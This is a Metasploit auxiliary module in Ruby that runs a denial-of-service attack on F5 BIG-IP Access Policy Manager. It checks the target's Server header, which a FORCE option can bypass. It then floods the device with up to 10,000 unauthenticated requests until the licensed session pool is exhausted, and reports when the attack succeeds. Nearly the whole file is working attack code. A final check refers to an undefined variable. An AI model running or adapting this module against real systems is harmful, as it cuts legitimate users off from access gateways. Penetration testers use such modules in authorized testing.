##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'F5 BigIP Access Policy Manager Session Exhaustion Denial of Service',
      'Description'    => %q{
        This module exploits a resource exhaustion denial of service in F5 BigIP devices. An
        unauthenticated attacker can establish multiple connections with BigIP Access Policy
        Manager (APM) and exhaust all available sessions defined in customer license. In the
        first step of the BigIP APM negotiation the client sends a HTTP request. The BigIP
        system creates a session, marks it as pending and then redirects the client to an access
        policy URI. Since BigIP allocates a new session after the first unauthenticated request,
        and deletes the session only if an access policy timeout expires, the attacker can exhaust
        all available sessions by repeatedly sending the initial HTTP request and leaving the
        sessions as pending.
      },
      'Author'         =>
        [
          'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',
          'Nikita Oleksov <neoleksov[at]gmail.com>',
          'Denis Kolegov <dnkolegov[at]gmail.com>'
        ],
      'References'     =>
        [
          ['URL', 'https://support.f5.com/kb/en-us/products/big-ip_apm/releasenotes/product/relnote-apm-11-6-0.html']
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSL' => true,
          'SSLVersion' => 'TLS1',
          'RPORT' => 443
        }
    ))

    register_options(
      [
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000]),
        OptBool.new('FORCE', [true, 'Proceed with attack even if a BigIP virtual isn\'t detected', false])
      ], self.class)
  end

  def run
    # Main function
    rlimit = datastore['RLIMIT']
    proto = datastore['SSL'] ? 'https' : 'http'
    force_attack = datastore['FORCE']

    # Send an initial test request
    res = send_request_cgi('method' => 'GET', 'uri' => '/')
    if res
      server = res.headers['Server']
      # Simple test based on HTTP Server header to detect BigIP virtual server
      unless force_attack
        if server !~ /BIG\-IP/ && server !~ /BigIP/
          print_error("#{peer} - BigIP virtual server was not detected. Please check options")
          return
        end
      end
      print_good("#{peer} - Starting DoS attack")
    else
      print_error("#{peer} - Unable to connect to BigIP. Please check options")
      return
    end

    # Start attack
    (1..rlimit).each do
      res = send_request_cgi('method' => 'GET', 'uri' => '/')
      if res && res.headers['Location'] == '/my.logout.php3?errorcode=14'
        print_good("#{peer} - The maximum number of concurrent user sessions has been reached. No new user sessions can start at this time")
        print_good("#{peer} - DoS attack is successful")
        return
      end
    end

    # Check if attack is unsuccessfull
    res = send_request_cgi('method' => 'GET', 'uri' => uri)
    if res.headers['Location'] == '/my.policy'
      print_status("#{peer} - DoS attack is unsuccessful. Try to increase the RLIMIT number")
    else
      print_status("#{peer} - Result is undefined. Try to manually determine DoS attack result")
    end

    rescue ::Rex::ConnectionRefused
      print_error("#{peer} - Unable to connect to BigIP")
    rescue ::Rex::ConnectionTimeout
      print_error("#{peer} - Unable to connect to BigIP. Please check options")
    rescue ::Errno::ECONNRESET
      print_error("#{peer} - The connection was reset. Probably BigIP \"Max In Progress Sessions Per Client IP\" counter was reached")
      print_status("#{peer} - DoS attack is unsuccessful")
    rescue ::OpenSSL::SSL::SSLError
      print_error("#{peer} - SSL/TLS connection error")
  end
end
